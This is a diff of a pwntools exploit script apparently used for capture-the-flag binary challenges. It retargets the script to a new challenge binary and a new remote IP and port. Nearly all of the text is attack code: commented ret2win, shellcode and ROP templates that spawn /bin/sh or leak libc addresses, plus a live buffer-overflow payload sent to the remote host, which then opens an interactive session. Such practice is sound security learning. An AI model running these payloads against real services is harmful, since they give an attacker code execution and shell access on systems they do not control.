@@ -5,10 +5,10 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-elf = context.binary = ELF('../nullcon23/babypwn', checksec=False)
+elf = context.binary = ELF('../bangla/chal', checksec=False)
 
 # Enable verbose logging so we can see exactly what is being sent (info/debug)
-context.log_level = 'debug'
+# context.log_level = 'debug'
 context.arch = "amd64"
 context.terminal = ['tmux', 'splitw', '-h']
 
@@ -17,8 +17,8 @@ context.terminal = ['tmux', 'splitw', '-h']
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141
-host = args.HOST or '52.59.124.14'
-port = int(args.PORT or 10100)
+host = args.HOST or '45.76.177.238'
+port = int(args.PORT or 9333)
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -67,15 +67,17 @@ continue
 #===========================================================
 
 #ret2win
+# io = start()
 # offset = find_ip(cyclic(300))
 # payload = flat(
 #     b'A' * offset,
 #     elf.symbols.win
 # )
 # io.sendline(payload)
+# io.interactive()
 
 #ret2shellcode
-shellcode = asm(shellcraft.amd64.linux.sh())
+# shellcode = asm(shellcraft.amd64.linux.sh())
 # shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
 # payload = shellcode + cyclic(16) + pack(shellcodevar_address)
 
@@ -166,3 +168,35 @@ shellcode = asm(shellcraft.amd64.linux.sh())
 # payload = cyclic(40) + pack(pop_rdi) + pack(bin_sh) + pack(ret) + pack(system)
 # io.sendline(payload)
 # io.interactive()
+
+# io = start()
+# ret = 0x000000000040101a
+# payload = cyclic(64) + pack(0) + pack(ret) + pack(elf.sym.win)
+# io.sendline(payload)
+# io.interactive()
+
+# io = start()
+# ret = 0x000000000040101a
+# io.recvlines(16)
+# input_addr = io.recvline().split()[-1]
+# payload = shellcode + cyclic(48) + pack(ret) + pack(int(input_addr, 16))
+# io.sendline(payload)
+# io.interactive()
+
+# io = start()
+# ret = 0x000000000000101a
+# pop_rdi = 0x0000000000001383
+# bin_sh = 0x1b45bd
+# system = 0x0000000000052290
+# io.recvlines(16)
+# input_addr = int(io.recvline().split()[-1], 16)
+# libc_base = input_addr - elf.sym.banner
+# payload = cyclic(40) + pack(pop_rdi) + pack(libc_base + 0x0000000000077820) + pack(elf.sym.puts) + pack(elf.sym.main)
+# io.sendline(payload)
+# io.interactive()
+
+
+io = start()
+payload = cyclic(12) + cyclic(4) + pack(0x1569) + pack(0xcafe69)
+io.sendline(payload)
+io.interactive()
